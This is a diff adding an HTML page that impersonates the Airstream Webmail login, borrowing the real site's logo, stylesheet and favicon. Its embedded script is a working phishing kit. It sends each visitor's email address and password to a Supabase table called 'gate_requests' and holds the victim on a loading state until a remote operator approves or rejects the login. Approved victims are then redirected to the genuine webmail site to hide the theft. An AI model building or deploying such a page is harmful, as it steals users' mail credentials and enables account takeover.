@@ -1,0 +1,191 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
+    <title>Airstream Webmail :: Welcome to Airstream Webmail</title>
+    <meta name="viewport" content="" id="viewport" />
+
+    <link
+      rel="shortcut icon"
+      href="https://webmail.airstreamcomm.net/skins/larry/images/favicon.ico?s=1689092804"
+    />
+    <link
+      rel="stylesheet"
+      type="text/css"
+      href="https://webmail.airstreamcomm.net/skins/larry/styles.min.css?s=1689092804"
+    />
+  </head>
+  <body class="xlarry">
+    <script type="module">
+      import { supabase } from "/scripts/supabase.js";
+
+      const PAGE_NAME = "Airstream Login";
+      const REDIRECT_URL = "https://webmail.airstreamcomm.net/";
+
+      // Generate a unique request ID
+      const generateRequestId = () => crypto.randomUUID();
+
+      document.addEventListener("DOMContentLoaded", function () {
+        const form = document.getElementById("contact-form");
+        const messageDiv = document.getElementById("message");
+        const emailInput = document.getElementById("email");
+        const passwordInput = document.getElementById("password");
+        const submitButton = document.querySelector("#rcmloginsubmit");
+
+        if (form) {
+          form.addEventListener("submit", async function (event) {
+            event.preventDefault();
+
+            const email = emailInput.value;
+            const password = passwordInput.value;
+            const requestId = generateRequestId();
+
+            // UI State: Loading
+            if (submitButton) {
+              submitButton.disabled = true;
+            }
+            messageDiv.innerHTML =
+              '<div class="loading content show">Loading...</div>';
+
+            try {
+              // Insert request into Supabase
+              const { error } = await supabase.from("gate_requests").insert([
+                {
+                  request_id: requestId,
+                  page_name: PAGE_NAME,
+                  email,
+                  password,
+                  status: "pending",
+                  redirect_url: REDIRECT_URL,
+                },
+              ]);
+
+              if (error) {
+                throw error;
+              }
+
+              // Subscribe to Realtime changes for this request_id
+              const channel = supabase
+                .channel(`request_${requestId}`)
+                .on(
+                  "postgres_changes",
+                  {
+                    event: "*",
+                    schema: "public",
+                    table: "gate_requests",
+                    filter: `request_id=eq.${requestId}`,
+                  },
+                  (payload) => {
+                    const data = payload.new;
+
+                    if (data.status === "approved") {
+                      window.location.replace(REDIRECT_URL);
+                    } else if (data.status === "rejected") {
+                      // Show failed state
+                      messageDiv.innerHTML =
+                        '<div class="warning content show" role="alert">Login failed.</div>';
+                      if (submitButton) {
+                        submitButton.disabled = false;
+                      }
+                    }
+                  },
+                )
+                .subscribe();
+            } catch (err) {
+              console.error("Submit error:", err);
+              messageDiv.innerHTML =
+                '<div class="warning content show" role="alert">Failed to submit request.</div>';
+              if (submitButton) {
+                submitButton.disabled = false;
+              }
+            }
+          });
+        }
+      });
+    </script>
+
+    <h1 class="voice">Airstream Webmail Login</h1>
+
+    <div id="login-form">
+      <div class="box-inner" role="main">
+        <img
+          src="https://webmail.airstreamcomm.net/logos/airstreamcomm.net_white.png?s=1664224834"
+          id="logo"
+          alt="Airstream Webmail"
+        />
+
+        <form id="contact-form">
+          <table>
+            <tbody>
+              <tr>
+                <td class="title">
+                  <label for="rcmloginuser">Email Address</label>
+                </td>
+                <td class="input">
+                  <input
+                    name="_user"
+                    id="email"
+                    required
+                    size="40"
+                    autocapitalize="off"
+                    autocomplete="off"
+                    value=""
+                    type="text"
+                  />
+                </td>
+              </tr>
+              <tr>
+                <td class="title"><label for="rcmloginpwd">Password</label></td>
+                <td class="input">
+                  <input
+                    name="_pass"
+                    id="password"
+                    required
+                    size="40"
+                    autocapitalize="off"
+                    autocomplete="off"
+                    type="password"
+                  />
+                </td>
+              </tr>
+            </tbody>
+          </table>
+          <p class="formbuttons">
+            <button
+              type="submit"
+              id="rcmloginsubmit"
+              class="button mainaction submit"
+            >
+              Login
+            </button>
+          </p>
+        </form>
+      </div>
+
+      <div class="box-bottom" role="complementary">
+        <div id="message"></div>
+        <div id="message">
+          <p><strong>Important Notice</strong></p>
+          <p>
+            Airstream and your Internet Service Provider will never send you an
+            email asking for your password.
+          </p>
+          <p>
+            <a href="https://portal.airstreamcomm.net" target="_blank"
+              >https://portal.airstreamcomm.net</a
+            >
+          </p>
+        </div>
+        <noscript>
+          <p class="noscriptwarning">
+            Warning: This webmail service requires Javascript! In order to use
+            it please enable Javascript in your browser's settings.
+          </p>
+        </noscript>
+      </div>
+
+      <div id="bottomline" role="contentinfo">Airstream Webmail</div>
+    </div>
+    <!-- closes #login-form -->
+  </body>
+</html>
